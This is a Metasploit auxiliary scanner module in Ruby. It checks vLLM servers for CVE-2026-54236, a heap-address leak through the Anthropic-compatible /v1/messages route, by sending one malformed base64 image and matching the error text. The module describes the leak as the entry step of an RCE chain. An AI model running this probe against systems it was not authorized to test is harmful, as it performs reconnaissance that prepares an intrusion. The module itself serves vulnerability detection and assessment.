# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Vulnerable builds echo PIL's UnidentifiedImageError verbatim, embedding the
  # BytesIO object's heap address. The CVE-2026-22778 fix (sanitize_message)
  # collapses it to "<_io.BytesIO object>" with no address.
  LEAK_RE = /<_io\.BytesIO object at 0x[0-9a-fA-F]+>/.freeze
  SANITIZED_RE = /<_io\.BytesIO object>/.freeze
  NO_IMAGE_RE = /does not support image input|image input is not supported|not a multimodal|no.*multimodal/i.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'vLLM Anthropic Router Heap-Address Information Leak Scanner',
        'Description' => %q{
          This module detects vLLM servers affected by CVE-2026-54236, an
          incomplete fix for CVE-2026-22778. The original fix added
          sanitize_message to the OpenAI router's exception handlers so a
          malformed image no longer leaks the Pillow BytesIO object repr
          ("<_io.BytesIO object at 0x...>", a live heap address). However the
          Anthropic-compatible router (/v1/messages, added in early 2026) and the
          speech-to-text endpoints echo str(exc) directly, so the same malformed
          image still leaks the heap address verbatim through those paths. The
          leak weakens ASLR and is the entry primitive of the CVE-2026-22778 RCE
          chain. All versions up to and including 0.23.0 are affected; no fixed
          release was available at disclosure.

          The module auto-detects the served model via /v1/models and sends a
          single benign request to /v1/messages containing a deliberately
          malformed base64 image. A leaked "0x" heap address is reported
          vulnerable; a sanitized message or an absent endpoint is reported safe.
          The probe never reaches the downstream heap-overflow code path.
        },
        'Author' => [
          'Kenneth LaCroix' # Metasploit module
        ],
        'References' => [
          ['CVE', '2026-54236'],
          ['CVE', '2026-22778'],
          ['GHSA', 'hgg8-fqqc-vfmw'],
          ['URL', 'https://advisories.gitlab.com/pypi/vllm/CVE-2026-54236/'],
          ['URL', 'https://github.com/vllm-project/vllm/pull/45119']
        ],
        'DisclosureDate' => '2026-06-11',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultOptions' => { 'RPORT' => 8000, 'SSL' => false }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to the vLLM OpenAI-compatible API', '/']),
        OptString.new('MODEL', [false, 'Model name for the probe (auto-detected from /v1/models when empty)', ''])
      ]
    )
  end

  # Reads the vLLM /version banner. Returns the version string or nil.
  def detect_version
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'version'))
    return nil unless res&.code == 200

    body = res.get_json_document
    body.is_a?(Hash) ? body['version'] : nil
  end

  # Returns the served model id (MODEL option override, else first /v1/models entry).
  def detect_model
    return datastore['MODEL'] unless datastore['MODEL'].to_s.empty?

    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'v1', 'models'))
    return nil unless res&.code == 200

    data = res.get_json_document&.dig('data')
    return nil unless data.is_a?(Array) && data.first.is_a?(Hash)

    data.first['id']
  end

  # Sends one malformed image to the Anthropic /v1/messages endpoint. Returns
  # :leak, :sanitized, :no_image, :no_messages, :no_model, or nil.
  def probe_messages_leak(model)
    return :no_model unless model

    body = {
      'model' => model,
      'max_tokens' => 1,
      'messages' => [
        {
          'role' => 'user',
          'content' => [
            { 'type' => 'text', 'text' => 'x' },
            { 'type' => 'image', 'source' => { 'type' => 'base64', 'media_type' => 'image/png', 'data' => 'bm90YW5pbWFnZQ==' } }
          ]
        }
      ]
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'v1', 'messages'),
      'ctype' => 'application/json',
      'data' => body
    )
    return nil unless res
    return :no_messages if res.code == 404

    msg = res.body.to_s
    return :leak if msg =~ LEAK_RE
    return :sanitized if msg =~ SANITIZED_RE
    return :no_image if msg =~ NO_IMAGE_RE

    nil
  end

  def check_host(_ip)
    ver = detect_version
    leak = probe_messages_leak(detect_model)
    tag = ver ? " (vLLM #{ver})" : ''

    case leak
    when :leak
      Exploit::CheckCode::Vulnerable("Heap-address leak confirmed via Anthropic /v1/messages#{tag}")
    when :sanitized
      Exploit::CheckCode::Safe("/v1/messages error is sanitized; not vulnerable#{tag}")
    when :no_image
      Exploit::CheckCode::Safe("No multimodal model loaded; leak path not reachable#{tag}")
    when :no_messages
      Exploit::CheckCode::Safe("Anthropic /v1/messages endpoint not available#{tag}")
    when :no_model
      Exploit::CheckCode::Unknown("No model advertised on /v1/models#{tag}")
    else
      ver ? Exploit::CheckCode::Detected("vLLM detected but no leak signal#{tag}") : Exploit::CheckCode::Unknown('Not a vLLM server')
    end
  end

  def run_host(ip)
    code = check_host(ip)

    if code == Exploit::CheckCode::Vulnerable
      print_good("#{peer} - #{code.reason}")
    else
      print_status("#{peer} - #{code.reason}")
      return
    end

    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      info: code.reason,
      refs: references
    )
  end
end
